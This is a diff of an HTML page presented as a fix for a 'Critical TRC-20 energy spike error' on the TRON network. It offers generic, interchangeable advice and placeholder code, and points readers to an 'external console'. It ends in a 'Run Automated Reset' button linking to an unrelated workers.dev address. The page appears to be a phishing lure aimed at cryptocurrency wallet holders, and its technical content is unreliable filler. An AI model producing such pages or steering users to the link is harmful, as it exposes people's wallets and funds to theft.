@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: -apple-system;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Critical TRC-20 energy spike error" when attempting to execute smart contracts or perform transactions on the TRON network, resulting in failed transactions and significant energy consumption.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual surge in energy consumption for TRC-20 transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 smart contracts, exceeding the allocated energy limits. This can be caused by inefficient contract code, excessive contract calls, or network congestion.</li>
+<li>This error occurs when the energy consumption of a smart contract exceeds the allowed limit, typically due to inefficient coding or an unexpected increase in transaction volume.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy settings to optimize energy consumption:</li>
-<li>Increase the contract's energy limit</li>
-<li>Implement energy-efficient contract code</li>
-<li>Monitor and limit contract calls to prevent excessive energy usage</li>
+<li>Increase the energy limit for the specific smart contract to accommodate the increased demand.</li>
+<li>Optimize the smart contract code to reduce energy consumption.</li>
+<li>Use a transaction batch processor to spread energy consumption across multiple blocks:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
-<span class="w">  </span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span>//<span class="w"> </span>frozen_balance
-<span class="w">  </span><span class="s1">&#39;3&#39;</span><span class="w"> </span>//<span class="w"> </span>frozen_duration
-<span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;contractAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TLxxxxxxxxxxxxxxxx&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;batchSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
+<p>Consider utilizing an external console for more advanced debugging and monitoring capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON wallet with sufficient funds</li>
-<li>TRONWeb or similar library for interacting with the TRON network</li>
-<li>Basic understanding of smart contract development and energy management on TRON</li>
+<li>A basic understanding of TRON's energy system and its relation to smart contracts.</li>
+<li>Access to the TRON network and a compatible wallet.</li>
+<li>Familiarity with smart contract development and optimization techniques.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
